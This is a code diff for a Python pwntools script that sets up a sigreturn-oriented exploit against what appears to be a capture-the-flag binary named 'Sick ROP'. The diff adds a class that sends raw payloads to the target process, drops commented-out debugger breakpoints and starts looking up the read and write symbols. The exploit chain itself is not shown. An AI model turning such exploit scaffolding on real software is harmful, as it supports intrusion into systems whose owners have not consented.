@@ -1,18 +1,23 @@
 from core.targetbase import TargetBase
-from custom.sick_rop import SickROPPwn
 from pwn import p64, u64
-from pwnlib.gdb import attach
 from loguru import logger
 from pwn import SigreturnFrame
+from pwnlib.tubes.process import process
+from abstract.pwntarget import PwnTarget
+
+
+class SickROPPwn(PwnTarget):
+    @classmethod
+    def main(cls, proc: process, payload: bytes, pwn_target, *args, **kwargs):
+        proc.send_raw(payload)
+
+    @classmethod
+    def input_handler(cls, proc: process, payload: bytes, *args, **kwargs):
+        return proc.recv(len(payload))
 
 
 if __name__ == '__main__':
     t = TargetBase(pwn_target=SickROPPwn)
-    # _, debugger = attach(t.process.pid, api=True)
-    # debugger.execute('b read')
-    # debugger.execute('b write')
-    # debugger.execute('b vuln')
-    # debugger.execute('c')
 
     read_ptr = t.sample.symbols["read"]
     write_ptr = t.sample.symbols["write"]
